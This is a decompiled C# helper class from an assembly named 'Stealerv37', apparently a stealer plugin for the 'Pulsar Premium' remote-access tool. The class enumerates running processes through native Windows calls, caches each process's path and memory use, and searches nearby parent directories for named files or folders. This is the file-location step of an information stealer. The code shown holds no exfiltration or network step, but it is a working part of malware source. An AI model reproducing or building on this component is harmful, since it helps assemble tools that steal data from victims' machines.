// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.ProcessWindows
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Helper;

public static class ProcessWindows
{
  private static readonly Lazy<List<ProcessWindows.ProcInfo>> _procInfos = new Lazy<List<ProcessWindows.ProcInfo>>(new Func<List<ProcessWindows.ProcInfo>>(ProcessWindows.BuildCache), true);

  public static List<ProcessWindows.ProcInfo> GetProcInfos()
  {
    return new List<ProcessWindows.ProcInfo>((IEnumerable<ProcessWindows.ProcInfo>) ProcessWindows._procInfos.Value);
  }

  public static List<string> FindFolder(string folderName)
  {
    if (string.IsNullOrWhiteSpace(folderName))
      return new List<string>();
    ConcurrentDictionary<string, byte> found = new ConcurrentDictionary<string, byte>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    ProcessWindows.SearchNearby(folderName, true, found);
    return new List<string>((IEnumerable<string>) found.Keys);
  }

  public static List<string> FindFile(string fileName)
  {
    if (string.IsNullOrWhiteSpace(fileName))
      return new List<string>();
    ConcurrentDictionary<string, byte> found = new ConcurrentDictionary<string, byte>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    ProcessWindows.SearchNearby(fileName, false, found);
    return new List<string>((IEnumerable<string>) found.Keys);
  }

  private static void SearchNearby(
    string target,
    bool isDirectory,
    ConcurrentDictionary<string, byte> found,
    int maxUp = 3)
  {
    if (string.IsNullOrEmpty(target))
      return;
    List<ProcessWindows.ProcInfo> source = ProcessWindows._procInfos.Value;
    if (source == null || source.Count == 0)
      return;
    string t = target.Trim();
    Parallel.ForEach<ProcessWindows.ProcInfo>((IEnumerable<ProcessWindows.ProcInfo>) source, (Action<ProcessWindows.ProcInfo>) (proc =>
    {
      try
      {
        string path1 = proc.Path;
        if (string.IsNullOrEmpty(path1))
          return;
        string directoryName = Path.GetDirectoryName(path1);
        if (string.IsNullOrEmpty(directoryName))
          return;
        for (int index = 0; index < maxUp && !string.IsNullOrEmpty(directoryName); ++index)
        {
          string path2 = Path.Combine(directoryName, t);
          if (isDirectory)
          {
            if (Directory.Exists(path2))
            {
              try
              {
                found.TryAdd(Path.GetFullPath(path2), (byte) 0);
              }
              catch
              {
              }
            }
          }
          else if (File.Exists(path2))
          {
            try
            {
              found.TryAdd(Path.GetFullPath(path2), (byte) 0);
            }
            catch
            {
            }
          }
          directoryName = Path.GetDirectoryName(directoryName);
        }
      }
      catch
      {
      }
    }));
  }

  private static List<ProcessWindows.ProcInfo> BuildCache()
  {
    ConcurrentDictionary<string, ProcessWindows.ProcInfo> result = new ConcurrentDictionary<string, ProcessWindows.ProcInfo>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    uint length1 = 4096 /*0x1000*/;
    uint[] pids = new uint[(int) length1];
    uint lpcbNeeded;
    if (!NativeMethods.EnumProcesses(pids, length1 * 4U, out lpcbNeeded))
    {
      uint length2 = 65536 /*0x010000*/;
      pids = new uint[(int) length2];
      if (!NativeMethods.EnumProcesses(pids, length2 * 4U, out lpcbNeeded))
        return new List<ProcessWindows.ProcInfo>();
    }
    int toExclusive = (int) (lpcbNeeded / 4U);
    if (toExclusive <= 0)
      return new List<ProcessWindows.ProcInfo>();
    ThreadLocal<StringBuilder> sbLocal = new ThreadLocal<StringBuilder>((Func<StringBuilder>) (() => new StringBuilder(1024 /*0x0400*/)));
    Parallel.For(0, toExclusive, (Action<int>) (i =>
    {
      uint dwProcessId = pids[i];
      switch (dwProcessId)
      {
        case 0:
          break;
        case 4:
          break;
        default:
          IntPtr num = IntPtr.Zero;
          try
          {
            num = NativeMethods.OpenProcess(5136U, false, (int) dwProcessId);
            if (num == IntPtr.Zero)
              break;
            string str1 = (string) null;
            try
            {
              StringBuilder exeName = sbLocal.Value;
              exeName.Clear();
              uint capacity = (uint) exeName.Capacity;
              if (NativeMethods.QueryFullProcessImageName(num, 0, exeName, ref capacity))
                str1 = exeName.ToString(0, (int) capacity);
            }
            catch
            {
            }
            string s;
            if (!string.IsNullOrEmpty(str1))
            {
              try
              {
                s = Path.GetFileNameWithoutExtension(str1);
              }
              catch
              {
                s = str1;
              }
            }
            else
              s = "";
            string str2 = "";
            try
            {
              NativeMethods.PROCESS_MEMORY_COUNTERS_EX ppsmemCounters = new NativeMethods.PROCESS_MEMORY_COUNTERS_EX();
              ppsmemCounters.cb = (uint) Marshal.SizeOf(typeof (NativeMethods.PROCESS_MEMORY_COUNTERS_EX));
              if (NativeMethods.GetProcessMemoryInfo(num, out ppsmemCounters, ppsmemCounters.cb))
                str2 = ProcessWindows.FormatBytes((long) ppsmemCounters.WorkingSetSize.ToUInt64());
            }
            catch
            {
            }
            ProcessWindows.ProcInfo procInfo = new ProcessWindows.ProcInfo()
            {
              Name = ProcessWindows.SafeString(s),
              Pid = dwProcessId.ToString(),
              Path = ProcessWindows.SafeString(str1),
              Memory = str2 ?? ""
            };
            result.TryAdd($"{procInfo.Path}|{procInfo.Pid}", procInfo);
            break;
          }
          catch
          {
            break;
          }
          finally
          {
            try
            {
              if (num != IntPtr.Zero)
                NativeMethods.CloseHandle(num);
            }
            catch
            {
            }
          }
      }
    }));
    sbLocal.Dispose();
    return new List<ProcessWindows.ProcInfo>((IEnumerable<ProcessWindows.ProcInfo>) result.Values);
  }

  private static string SafeString(string s) => !string.IsNullOrEmpty(s) ? s : "";

  private static string FormatBytes(long bytes)
  {
    if (bytes >= 1073741824L /*0x40000000*/)
      return ((double) bytes / 1073741824.0).ToString("0.##") + " GB";
    if (bytes >= 1048576L /*0x100000*/)
      return ((double) bytes / 1048576.0).ToString("0.##") + " MB";
    return bytes >= 1024L /*0x0400*/ ? ((double) bytes / 1024.0).ToString("0.##") + " KB" : bytes.ToString() + " B";
  }

  public class ProcInfo
  {
    public string Name { get; set; }

    public string Pid { get; set; }

    public string Path { get; set; }

    public string Memory { get; set; }
  }
}
